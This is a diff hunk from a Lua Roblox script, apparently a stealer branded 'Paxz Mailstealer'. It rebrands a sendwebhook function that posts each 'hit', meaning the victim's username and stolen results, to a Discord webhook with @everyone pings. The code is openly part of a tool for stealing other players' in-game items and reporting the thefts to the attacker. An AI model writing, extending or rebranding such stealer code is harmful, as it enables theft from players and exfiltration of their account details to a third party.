@@ -50,8 +50,8 @@ local RapFormated = (require(game:GetService("ReplicatedStorage").Library.Functi
 local function sendwebhook(msg)
 local msg = {
 	["avatar_url"] = "https://cdn.discordapp.com/attachments/1117107901325115493/1120056544558596147/Paxz.gif",
-	["content"]= "**<:HosteeScriptz:1120669415676063854> || @here @everyone || ".. _G.UserName .." We Got Some Good News But First, You Got A New Hit With Paxz <:Paxz:1117120147786833981>**  ",
-	["username"] = "✗ Hostee Scriptz MailStealer ✗",
+	["content"]= "**<:Paxz:1117120147786833981> || @here @everyone || ".. _G.UserName .." We Got Some Good News But First, You Got A New Hit With Paxz <:Paxz:1117120147786833981>**  ",
+	["username"] = "𝐏𝐀𝕩ⓩ 𝐌άＩ𝓛 𝐬𝔱𝐄𝔸ᒪ𝐄𝐫",
 	["embeds"]= {
 	  {
 		["title"]= "`Paxz Mailstealer Results`",
